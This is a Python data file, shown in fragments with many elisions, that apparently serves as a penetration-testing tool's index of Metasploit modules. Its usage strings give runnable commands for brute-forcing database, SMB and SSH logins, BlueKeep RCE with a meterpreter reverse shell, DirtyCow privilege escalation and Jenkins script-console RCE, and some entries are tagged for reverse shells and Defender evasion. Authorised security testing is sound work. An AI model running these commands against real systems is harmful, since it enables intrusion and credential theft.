MODULES_DB = [
    ...
    },
    {
        ...
        "targets": ["Network", "Telecom"],
        "tags": ["sctp", "port", "scan", "telecom"],
    ...
    },
    {
        ...
        "targets": ["Web", "Drupal"],
        "tags": ["drupal", "cms", "enumeration", "users"],
    ...
    },
    {
        ...
        "targets": ["Web", "Tomcat"],
        "tags": ["tomcat", "manager", "login", "brute-force"],
    ...
    },
    {
        ...
        "targets": ["Database", "Windows", "MSSQL"],
        "tags": ["mssql", "database", "login", "brute-force", "windows"],
        "usage": "use auxiliary/scanner/mssql/mssql_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "DOMAIN"]
    },
    {
        ...
        "targets": ["Database", "PostgreSQL", "Linux"],
        "tags": ["postgresql", "postgres", "database", "login", "brute-force"],
        "usage": "use auxiliary/scanner/postgres/postgres_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "DATABASE"]
    },
    {
        ...
        "tags": ["oracle", "database", "login", "brute-force"],
        "usage": "use auxiliary/scanner/oracle/oracle_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "SID"]
    },
    {
        ...
        "targets": ["Database", "MongoDB", "NoSQL"],
        "tags": ["mongodb", "nosql", "database", "login"],
    ...
    },
    {
        ...
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "users", "enumeration", "rid"],
    ...
    },
    {
        ...
        "targets": ["Windows", "SMB"],
        "tags": ["smb", "login", "brute-force", "windows"],
        "usage": "use auxiliary/scanner/smb/smb_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "SMBUser", "SMBPass", "SMBDomain", "PASS_FILE"]
    },
    ...
    # SSH SCANNING
    {
        ...
        "targets": ["Linux", "Unix", "SSH"],
        "tags": ["ssh", "version", "fingerprint", "linux"],
    ...
    },
    {
        ...
        "targets": ["Linux", "Unix", "SSH"],
        "tags": ["ssh", "login", "brute-force", "credentials"],
        "usage": "use auxiliary/scanner/ssh/ssh_login\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "PASSWORD", "PASS_FILE", "USER_FILE"]
    },
    {
        ...
        "targets": ["Linux", "Unix", "SSH"],
        "tags": ["ssh", "keys", "authentication", "pubkey"],
        "usage": "use auxiliary/scanner/ssh/ssh_login_pubkey\nset RHOSTS target_ip\nset KEY_PATH /path/to/key\nrun",
        "options": ["RHOSTS", "RPORT", "USERNAME", "KEY_PATH"]
    },
    ...
    },
    {
        ...
        "targets": ["Web", "Linux", "Unix"],
        "tags": ["shellshock", "bash", "cgi", "cve-2014-6271"],
        "usage": "use auxiliary/scanner/http/apache_mod_cgi_bash_env\nset RHOSTS target_ip\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "CMD"]
    },
    {
    ...
    },
    {
        ...
        "targets": ["Windows", "RDP"],
        "tags": ["bluekeep", "rdp", "cve-2019-0708", "windows"],
    ...
    },
    {
        ...
        "targets": ["Windows", "RDP"],
        "tags": ["bluekeep", "rdp", "cve-2019-0708", "rce"],
        "usage": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\nset RHOSTS target_ip\nset payload windows/x64/meterpreter/reverse_tcp\nrun",
        "options": ["RHOSTS", "RPORT", "TARGET"]
    },
    ...
    },
    {
        ...
        "targets": ["Linux"],
        "tags": ["dirtycow", "privilege-escalation", "kernel", "race-condition"],
        "usage": "use exploit/linux/local/dirtycow\nset SESSION session_id\nrun",
        "options": ["SESSION", "COMPILE"]
    },
    ...
    },
    {
        ...
        "targets": ["Web", "Jenkins"],
        "tags": ["jenkins", "script-console", "rce"],
        "usage": "use exploit/multi/http/jenkins_script_console\nset RHOSTS target_ip\nset TARGETURI /jenkins/\nrun",
        "options": ["RHOSTS", "RPORT", "TARGETURI", "USERNAME", "PASSWORD"]
    },
    ...
    },
    {
        ...
        "targets": ["Windows"],
        "tags": ["shell", "reverse", "tcp", "windows"],
    ...
    # LINUX PAYLOADS
    {
        ...
        "targets": ["Linux"],
        "tags": ["meterpreter", "reverse", "tcp", "linux", "x86"],
    ...
    },
    {
        ...
        "targets": ["Java", "Web"],
        "tags": ["jsp", "java", "shell", "reverse", "tcp"],
    ...
    },
    {
        ...
        "targets": ["Windows"],
        "tags": ["evasion", "powershell", "windows-defender"],
